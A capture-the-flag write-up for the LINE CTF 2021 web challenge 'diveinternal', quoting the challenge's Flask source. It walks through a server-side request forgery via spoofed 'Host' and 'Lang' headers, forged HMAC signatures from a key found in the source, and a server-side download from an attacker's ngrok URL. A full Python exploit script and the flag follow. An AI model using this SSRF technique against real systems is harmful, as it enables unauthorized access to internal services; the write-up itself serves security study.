# LINE CTF 2021 - Web - diveinternal

## Problem

> Target the server's internal entries, access admin, and roll back.  
> Keytime: Asia/Japan

## Solution

We analyzed the given website and source code, and found the following:

* This application has the `public` side and the `private` side, and `private` is not directly accessible.
* We can get the FLAG by calling `/rollback` on the `private` side with `Sign`, `Key` and `dbhash` as parameters.
* `/apis`, `/apis/coin` and `/apis/addsub` access from `public` to `private`.

So, we should access `private` indirectly form `public`, and call `/rollback` with the required parameters.

### 1. Access to `/rollback` on `private` from `public`

We found that we can call any endpoints on `private` by calling `/apis/coin` with `Lang: <ENDPOINT>` and `Host: private:5000` as header parameter.

```py
@app.route('/coin', methods=['GET'])
def coin():
    try:
        response = app.response_class()
        language = LanguageNomarize(request)
        response.headers["Lang"] =  language
        data = getCoinInfo()
        response.data = json.dumps(data)
        return response
    except Exception as e :
        err = 'Error On  {f} : {c}, Message, {m}, Error on line {l}'.format(f = sys._getframe().f_code.co_name ,c = type(e).__name__, m = str(e), l = sys.exc_info()[-1].tb_lineno)
        logger.error(err)
```

`LanguageNomarize` function is called on `/apis/coin`, and the response contains the return value.

```py
def LanguageNomarize(request):
    if request.headers.get('Lang') is None:
        return "en"
    else:
        regex = '^[!@#$\\/.].*/.*' # Easy~~
        language = request.headers.get('Lang')
        language = re.sub(r'%00|%0d|%0a|[!@#$^]|\.\./', '', language)
        if re.search(regex,language):
            return request.headers.get('Lang')
        
        try:
            data = requests.get(request.host_url+language, headers=request.headers)
            if data.status_code == 200:
                return data.text
            else:
                return request.headers.get('Lang')
        except:
            return request.headers.get('Lang')
```

GET `request.host_url+language` is hit on `LanguageNomarize` function.  
Setting `Lang: <ENDPOINT>` and `Host: private:5000` as header parameter, we can access `private` endpoints.

### 2. Call `/rollback` with required parameters

We should call `/rollback` with required parameters: `Sign`, `Key` and `dbHash`.

#### `Sign`

We can calcurate `Sign` by `hmac.new(privateKey, request.query_string, hashlib.sha512).hexdigest()`.

```py
def SignCheck(request):
    sigining = hmac.new(privateKey, request.query_string, hashlib.sha512)

    if sigining.hexdigest() != request.headers.get('Sign'):
        return False
    else:
        return True
```

#### `Key`

We can calcurate `Key` by `hashlib.sha512((dbhash).encode('ascii')).hexdigest()`, and can get `dbhash` by calling `/integrityStatus` on `private` side.

```py
    def IntegrityCheck(self, key, dbHash): 
        if self.integrityKey == key:
            pass
        else:
            return json.dumps(status['key'])
        ︙
```

We need pass `self.integrityKey == key`.

```py
    def UpdateKey(self):
        file = open(os.environ['DBFILE'],'rb').read()
        self.dbHash = hashlib.md5(file).hexdigest()
        self.integrityKey = hashlib.sha512((self.dbHash).encode('ascii')).hexdigest()
```

`integrityKey` is calcurated by `hashlib.sha512((dbHash).encode('ascii'))`.

```py
@app.route('/integrityStatus', methods=['GET'])
def integritycheck():
    data = {'db':'database/master.db','dbhash':activity.dbHash}
    data = json.dumps(data)
    return data
```

We can get `dbHash` by calling `/integrityStatus`.

#### `dbhash`

We should create `backup/{filename}` in advance, and set `dbhash` to `filename`.

```py
    def IntegrityCheck(self, key, dbHash): 
        ︙
        if self.dbHash != dbHash:
            flag = RunRollbackDB(dbHash)
            logger.debug('DB File changed!!'+dbHash)
            file = open(os.environ['DBFILE'],'rb').read()
            self.dbHash = hashlib.md5(file).hexdigest()
            self.integrityKey = hashlib.sha512((self.dbHash).encode('ascii')).hexdigest()
            return flag
        return "DB is safe!"
```

`dbHash` should be `self.dbHash != dbHash`.

```py
def RunRollbackDB(dbhash):
    try:
        ︙
        dbhash = ''.join(e for e in dbhash if e.isalnum())
        if os.path.isfile('backup/'+dbhash):
            with open('FLAG', 'r') as f:
                flag = f.read()
                return flag
        else:
            return "Where is file?"
```

`backup/{dbHash}` should exist.

```py
def WriteFile(url):
    local_filename = url.split('/')[-1]
    with requests.get(url, stream=True) as r:
        r.raise_for_status()
        with open('backup/'+local_filename, 'wb') as f:
            for chunk in r.iter_content(chunk_size=8192): 
                f.write(chunk)
︙
@app.route('/download', methods=['GET','POST'])
def download():
    try:
        ︙
        if request.method == 'GET':
            src = request.args.get('src')

            if valid_download(src):
                pass
            else:
                return json.dumps(status.get('false'))
        ︙
        WriteFile(src)
        return json.dumps(status.get('success'))
        ︙
```

We can create `backup/{local_filename}` by calling `/download` with `src`.

### 3. Get the FLAG

We executed the following code with serving `dummy` file by ngrok, and got the flag.

```py
import hmac
import hashlib
import json
import requests

# SERVICE_URL = 'http://localhost:12004'
SERVICE_URL = '<SERVICE_URL>'
NGROK_URL = '<NGROK_URL>'
PRIVATE_KEY = b'let\'sbitcorinparty'


def integrityStatus():
    res = requests.get(f'{SERVICE_URL}/apis/coin', headers={
        'Host': 'private:5000',
        'Lang': 'integrityStatus'
    })
    return res.headers.get('Lang')


def download(src: str):
    sigining = hmac.new(
        PRIVATE_KEY, f'src={src}'.encode('ascii'), hashlib.sha512).hexdigest()
    res = requests.get(f'{SERVICE_URL}/apis/coin', headers={
        'Host': 'private:5000',
        'Lang': f'download?src={src}',
        'Sign': sigining
    })
    return res.headers.get('Lang')


def rollback(key: str, dbhash: str):
    sigining = hmac.new(
        PRIVATE_KEY, f'dbhash={dbhash}'.encode('ascii'), hashlib.sha512).hexdigest()
    res = requests.get(f'{SERVICE_URL}/apis/coin', headers={
        'Host': 'private:5000',
        'Lang': f'rollback?dbhash={dbhash}',
        'Sign': sigining,
        'Key': key
    })
    return res.headers.get('Lang')


if __name__ == '__main__':
    res = integrityStatus()
    print(res)

    status = json.loads(res)
    dbhash = status['dbhash']

    file = 'dummy'
    res = download(f'{NGROK_URL}/{file}')
    print(res)

    key = hashlib.sha512((dbhash).encode('ascii')).hexdigest()
    res = rollback(key, file)
    print(res)
```

`LINECTF{YOUNGCHAYOUNGCHABITCOINADAMYMONEYISBURNING}`
